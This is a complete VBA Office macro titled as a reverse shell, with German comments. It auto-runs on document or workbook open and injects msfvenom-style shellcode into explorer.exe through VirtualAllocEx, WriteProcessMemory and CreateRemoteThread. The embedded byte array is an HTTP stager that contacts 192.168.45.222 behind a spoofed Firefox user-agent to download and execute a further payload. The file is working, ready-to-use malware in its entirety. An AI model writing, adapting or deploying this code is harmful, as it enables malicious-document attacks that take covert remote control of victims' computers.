'=============================================================================
' VBA Reverse Shell – explorer.exe Process Injection
'=============================================================================
Private Declare PtrSafe Function OpenProcess Lib "kernel32" _
    (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, _
     ByVal dwProcessId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" _
    (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, _
     ByVal dwSize As Long, ByVal flAllocationType As Long, _
     ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" _
    (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, _
     ByRef lpBuffer As Any, ByVal nSize As Long, _
     ByRef lpNumberOfBytesWritten As Long) As Long

Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" _
    (ByVal hProcess As LongPtr, ByVal lpThreadAttributes As LongPtr, _
     ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, _
     ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, _
     ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
    (ByVal hObject As LongPtr) As Long

Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32" _
    (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As LongPtr

Private Declare PtrSafe Function Process32First Lib "kernel32" _
    (ByVal hSnapshot As LongPtr, ByRef lppe As PROCESSENTRY32) As Long

Private Declare PtrSafe Function Process32Next Lib "kernel32" _
    (ByVal hSnapshot As LongPtr, ByRef lppe As PROCESSENTRY32) As Long

Private Type PROCESSENTRY32
    dwSize As Long
    cntUsage As Long
    th32ProcessID As Long
    th32DefaultHeapID As LongPtr
    th32ModuleID As Long
    cntThreads As Long
    th32ParentProcessID As Long
    pcPriClassBase As Long
    dwFlags As Long
    szExeFile As String * 260
End Type

Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const MEM_COMMIT = &H1000
Private Const MEM_RESERVE = &H2000
Private Const PAGE_EXECUTE_READWRITE = &H40
Private Const TH32CS_SNAPPROCESS = &H2
Private Const INVALID_HANDLE_VALUE = -1

' ====================================================================
' DEIN SHELLCODE – direkt aus msfvenom / C2 (dezimales Array)
' ====================================================================
Private Function GetShellcodeBytes() As Byte()
    Dim sc As Variant
    sc = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,77,49,201,72,139,114,80,72,15,183,74,74,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24, _
11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,68,139,64,32,73,1,208,139,72,24,80,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,65,193,201,13,172,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7, _
255,213,83,83,232,84,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,77,97,99,105,110,116,111,115,104,59,32,73,110,116,101,108,32,77,97,99,32,79,83,32,88,32,49,52,46,55,59,32,114,118,58,49,51,51,46,48,41,32,71,101,99,107,111,47,50,48,49,48,48,49,48,49,32,70, _
105,114,101,102,111,120,47,49,51,51,46,48,0,89,83,90,77,49,192,77,49,201,83,83,73,186,58,86,121,167,0,0,0,0,255,213,232,15,0,0,0,49,57,50,46,49,54,56,46,52,53,46,50,50,50,0,90,72,137,193,73,199,192,187,1,0,0,77,49,201,83,83,106,3,83,73,186,87,137,159, _
198,0,0,0,0,255,213,232,41,0,0,0,47,106,80,51,74,109,108,53,108,82,48,76,90,117,116,105,52,115,45,102,101,98,65,102,50,84,49,102,77,52,104,98,99,99,115,118,48,112,90,120,0,72,137,193,83,90,65,88,77,49,201,83,72,184,0,50,168,132,0,0,0,0,80,83,83,73,199,194, _
235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31,90,82,104,128,51,0,0,73,137,224,106,4,65,89,73,186,117,70,158,134,0,0,0,0,255,213,77,49,192,83,90,72,137,241,77,49,201,77,49,201,83,83,73,199,194,45,6,24,123,255,213,133,192,117,31,72,199,193,136,19,0,0,73, _
186,68,240,53,224,0,0,0,0,255,213,72,255,207,116,2,235,170,232,85,0,0,0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16,0,0,73,186,88,164,83,229,0,0,0,0,255,213,72,147,83,83,72,137,231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18,150, _
137,226,0,0,0,0,255,213,72,131,196,32,133,192,116,178,102,139,7,72,1,195,133,192,117,210,88,195,88,106,0,89,73,199,194,240,181,162,86,255,213)

    ' Variant -> Byte-Array konvertieren
    Dim buf() As Byte
    ReDim buf(0 To UBound(sc))
    
    Dim i As Long
    For i = 0 To UBound(sc)
        buf(i) = CByte(sc(i) And &HFF)
    Next i
    
    GetShellcodeBytes = buf
End Function

' ====================================================================
' explorer.exe PID suchen
' ====================================================================
Private Function GetExplorerPID() As Long
    Dim hSnapshot As LongPtr
    Dim pe32 As PROCESSENTRY32
    Dim ret As Long
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    If hSnapshot = INVALID_HANDLE_VALUE Then Exit Function
    
    pe32.dwSize = LenB(pe32)
    ret = Process32First(hSnapshot, pe32)
    
    Do While ret <> 0
        Dim exeName As String
        exeName = Left$(pe32.szExeFile, InStr(pe32.szExeFile, Chr$(0)) - 1)
        If StrComp(exeName, "explorer.exe", vbTextCompare) = 0 Then
            GetExplorerPID = pe32.th32ProcessID
            CloseHandle hSnapshot
            Exit Function
        End If
        ret = Process32Next(hSnapshot, pe32)
    Loop
    
    CloseHandle hSnapshot
End Function

' ====================================================================
' Haupt-Injektionsroutine
' ====================================================================
Public Sub Inject()
    Dim pid As Long
    Dim hProcess As LongPtr
    Dim pRemoteMemory As LongPtr
    Dim shellcode() As Byte
    Dim bytesWritten As Long
    Dim hThread As LongPtr
    Dim threadId As Long
    
    pid = GetExplorerPID()
    If pid = 0 Then
        MsgBox "explorer.exe nicht gefunden.", vbCritical
        Exit Sub
    End If
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
    If hProcess = 0 Then
        MsgBox "OpenProcess fehlgeschlagen – bitte als Administrator ausführen.", vbCritical
        Exit Sub
    End If
    
    shellcode = GetShellcodeBytes()
    
    pRemoteMemory = VirtualAllocEx(hProcess, 0, UBound(shellcode) + 1, _
                                   MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If pRemoteMemory = 0 Then
        CloseHandle hProcess
        MsgBox "VirtualAllocEx fehlgeschlagen.", vbCritical
        Exit Sub
    End If
    
    If WriteProcessMemory(hProcess, pRemoteMemory, shellcode(0), _
                          UBound(shellcode) + 1, bytesWritten) = 0 Then
        CloseHandle hProcess
        MsgBox "WriteProcessMemory fehlgeschlagen.", vbCritical
        Exit Sub
    End If
    
    hThread = CreateRemoteThread(hProcess, 0, 0, pRemoteMemory, 0, 0, threadId)
    If hThread = 0 Then
        CloseHandle hProcess
        MsgBox "CreateRemoteThread fehlgeschlagen.", vbCritical
        Exit Sub
    End If
    
    CloseHandle hThread
    CloseHandle hProcess
    
    ' Dokument nach Injection schließen (optional)
    ' ActiveDocument.Close False   ' Word
    ' ThisWorkbook.Close False     ' Excel
End Sub

' ====================================================================
' Auto-Ausführung
' ====================================================================
Private Sub Document_Open()
    Inject
End Sub

Private Sub Workbook_Open()
    Inject
End Sub
